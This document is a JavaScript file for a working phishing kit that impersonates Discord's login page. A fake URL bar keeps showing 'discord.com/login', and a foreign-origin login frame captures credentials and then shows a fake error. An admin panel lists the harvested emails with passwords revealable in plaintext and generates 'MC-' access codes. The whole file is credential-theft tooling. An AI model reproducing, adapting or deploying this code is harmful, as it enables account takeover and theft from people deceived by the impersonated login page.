// Firebase Configuration
const firebaseConfig = {
    databaseURL: "https://kom-tm-default-rtdb.europe-west1.firebasedatabase.app/"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Elements
const loginScreen = document.getElementById('login-screen');
const successScreen = document.getElementById('success-screen');
const errorScreen = document.getElementById('error-screen');
const adminScreen = document.getElementById('admin-screen');
const adminAccessBtn = document.getElementById('admin-access-btn');
const tryAgainBtn = document.getElementById('try-again-btn');
const adminLogoutBtn = document.getElementById('admin-logout-btn');

// URL Bar Elements
const urlInput = document.getElementById('url-input');
const urlWarningModal = document.getElementById('url-warning-modal');
const modalCancelBtn = document.getElementById('modal-cancel-btn');
const modalContinueBtn = document.getElementById('modal-continue-btn');

// Admin elements
const generateCodeBtn = document.getElementById('generate-code-btn');
const generatedCodeDisplay = document.getElementById('generated-code-display');
const codeText = document.getElementById('code-text');
const codeStatus = document.getElementById('code-status');
const copyCodeBtn = document.getElementById('copy-code-btn');
const codesList = document.getElementById('codes-list');
const usersTbody = document.getElementById('users-tbody');

let currentUserEmail = null;
let isAdmin = false;
let currentGeneratedCode = '';
const originalUrl = 'https://discord.com/login';

// URL Bar Logic
let urlChanged = false;

urlInput.addEventListener('focus', () => {
    urlInput.select();
});

urlInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        const newUrl = urlInput.value.trim();
        
        if (newUrl !== originalUrl && newUrl !== '') {
            urlChanged = true;
            urlWarningModal.classList.remove('hidden');
        }
    }
});

urlInput.addEventListener('blur', () => {
    const newUrl = urlInput.value.trim();
    
    if (newUrl !== originalUrl && newUrl !== '' && !urlChanged) {
        urlChanged = true;
        urlWarningModal.classList.remove('hidden');
    }
});

// Modal Cancel
modalCancelBtn.addEventListener('click', () => {
    urlWarningModal.classList.add('hidden');
    urlInput.value = originalUrl;
    urlChanged = false;
});

// Modal Continue (acts as Google then resets)
modalContinueBtn.addEventListener('click', () => {
    urlWarningModal.classList.add('hidden');
    
    // Brief flash/loading effect
    const iframe = document.getElementById('login-iframe');
    iframe.style.opacity = '0.5';
    
    setTimeout(() => {
        // Reset URL and refresh
        urlInput.value = originalUrl;
        urlChanged = false;
        iframe.src = iframe.src;
        iframe.style.opacity = '1';
    }, 500);
});

// Click backdrop to close modal
document.querySelector('.modal-backdrop')?.addEventListener('click', () => {
    urlWarningModal.classList.add('hidden');
    urlInput.value = originalUrl;
    urlChanged = false;
});

// Listen for messages from the login iframe
window.addEventListener('message', (event) => {
    // Verify origin
    if (event.origin !== 'https://mccglogin.pages.dev') {
        return;
    }
    
    if (event.data.type === 'login-success') {
        currentUserEmail = event.data.email;
        handleLoginSuccess(event.data.email);
    }
});

async function handleLoginSuccess(email) {
    // Hide login, show success
    loginScreen.classList.add('hidden');
    successScreen.classList.remove('hidden');
    
    // Check if user is admin
    await checkAdminStatus(email);
    
    // After loading animation, show error (unless admin)
    setTimeout(() => {
        successScreen.classList.add('hidden');
        
        if (isAdmin) {
            adminAccessBtn.classList.remove('hidden');
        }
        
        errorScreen.classList.remove('hidden');
    }, 2500);
}

async function checkAdminStatus(email) {
    try {
        const snapshot = await database.ref('logins').orderByChild('email').equalTo(email).once('value');
        const data = snapshot.val();
        
        if (data) {
            const entries = Object.values(data);
            isAdmin = entries.some(entry => entry.owner === true);
        }
    } catch (error) {
        console.error('Error checking admin status:', error);
    }
}

// Try Again Button
tryAgainBtn.addEventListener('click', () => {
    errorScreen.classList.add('hidden');
    loginScreen.classList.remove('hidden');
    
    // Reload iframe
    const iframe = document.getElementById('login-iframe');
    iframe.src = iframe.src;
});

// Admin Access Button
adminAccessBtn.addEventListener('click', () => {
    errorScreen.classList.add('hidden');
    loginScreen.classList.add('hidden');
    adminAccessBtn.classList.add('hidden');
    adminScreen.classList.remove('hidden');
    
    loadAdminData();
});

// Admin Logout
adminLogoutBtn.addEventListener('click', () => {
    adminScreen.classList.add('hidden');
    loginScreen.classList.remove('hidden');
    adminAccessBtn.classList.remove('hidden');
});

// Generate MC-CODE
generateCodeBtn.addEventListener('click', async () => {
    const code = generateMCCode();
    currentGeneratedCode = code;
    
    try {
        await database.ref('codes/' + code).set({
            code: code,
            status: 'working',
            createdAt: new Date().toISOString(),
            createdBy: currentUserEmail
        });
        
        codeText.textContent = code;
        codeStatus.textContent = '(working)';
        codeStatus.className = 'code-status working';
        generatedCodeDisplay.classList.remove('hidden');
        
        loadCodes();
    } catch (error) {
        console.error('Error generating code:', error);
    }
});

// Copy Code
copyCodeBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(currentGeneratedCode);
    copyCodeBtn.textContent = 'Copied!';
    setTimeout(() => {
        copyCodeBtn.textContent = 'Copy';
    }, 2000);
});

// Generate MC Code
function generateMCCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = 'MC-';
    for (let i = 0; i < 8; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// Load Admin Data
function loadAdminData() {
    loadCodes();
    loadLogins();
}

// Load Codes
function loadCodes() {
    database.ref('codes').on('value', (snapshot) => {
        const codes = snapshot.val();
        let html = '';
        let activeCount = 0;
        
        if (codes) {
            Object.keys(codes).reverse().forEach(key => {
                const code = codes[key];
                if (code.status === 'working') activeCount++;
                
                const date = new Date(code.createdAt).toLocaleDateString();
                const statusClass = code.status === 'working' ? 'working' : 'used';
                
                html += `
                    <div class="code-item">
                        <div class="code-item-left">
                            <span class="code-item-code">${code.code}</span>
                            <span class="code-item-date">${date}</span>
                            <span class="code-status ${statusClass}">(${code.status})</span>
                        </div>
                        <div class="code-item-actions">
                            <button class="icon-btn copy-list-code" data-code="${code.code}">Copy</button>
                            <button class="delete-btn delete-code" data-key="${key}">Delete</button>
                        </div>
                    </div>
                `;
            });
        }
        
        codesList.innerHTML = html || '<p class="empty-state">No codes generated yet</p>';
        document.getElementById('active-codes').textContent = activeCount;
        
        // Add event listeners
        document.querySelectorAll('.copy-list-code').forEach(btn => {
            btn.addEventListener('click', function() {
                navigator.clipboard.writeText(this.dataset.code);
                this.textContent = 'Copied!';
                setTimeout(() => { this.textContent = 'Copy'; }, 2000);
            });
        });
        
        document.querySelectorAll('.delete-code').forEach(btn => {
            btn.addEventListener('click', function() {
                if (confirm('Delete this code?')) {
                    database.ref('codes/' + this.dataset.key).remove();
                }
            });
        });
    });
}

// Load Logins
function loadLogins() {
    database.ref('logins').on('value', (snapshot) => {
        const logins = snapshot.val();
        let html = '';
        let totalCount = 0;
        let todayCount = 0;
        const today = new Date().toDateString();
        
        if (logins) {
            Object.keys(logins).reverse().forEach(key => {
                const login = logins[key];
                totalCount++;
                
                const loginDate = new Date(login.timestamp);
                if (loginDate.toDateString() === today) todayCount++;
                
                const formattedDate = loginDate.toLocaleString();
                const ownerBadge = login.owner ? '<span class="badge" style="margin-left:8px;font-size:10px;">ADMIN</span>' : '';
                
                html += `
                    <tr>
                        <td>${escapeHtml(login.email)}${ownerBadge}</td>
                        <td>
                            <div class="password-cell">
                                <span class="password-text" data-password="${escapeHtml(login.password)}">********</span>
                                <button class="icon-btn toggle-password">Show</button>
                            </div>
                        </td>
                        <td>${formattedDate}</td>
                        <td>
                            <button class="icon-btn make-admin" data-key="${key}" ${login.owner ? 'disabled style="opacity:0.5"' : ''}>
                                ${login.owner ? 'Is Admin' : 'Make Admin'}
                            </button>
                            <button class="delete-btn delete-login" data-key="${key}">Delete</button>
                        </td>
                    </tr>
                `;
            });
        }
        
        usersTbody.innerHTML = html || '<tr><td colspan="4" class="empty-state">No logins captured yet</td></tr>';
        document.getElementById('user-count').textContent = totalCount;
        document.getElementById('total-logins').textContent = totalCount;
        document.getElementById('today-logins').textContent = todayCount;
        
        // Password toggle
        document.querySelectorAll('.toggle-password').forEach(btn => {
            btn.addEventListener('click', function() {
                const span = this.previousElementSibling;
                const isHidden = span.textContent === '********';
                span.textContent = isHidden ? span.dataset.password : '********';
                this.textContent = isHidden ? 'Hide' : 'Show';
            });
        });
        
        // Make admin
        document.querySelectorAll('.make-admin').forEach(btn => {
            btn.addEventListener('click', function() {
                if (!this.disabled && confirm('Make this user an admin?')) {
                    database.ref('logins/' + this.dataset.key).update({ owner: true });
                }
            });
        });
        
        // Delete login
        document.querySelectorAll('.delete-login').forEach(btn => {
            btn.addEventListener('click', function() {
                if (confirm('Delete this login record?')) {
                    database.ref('logins/' + this.dataset.key).remove();
                }
            });
        });
    });
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
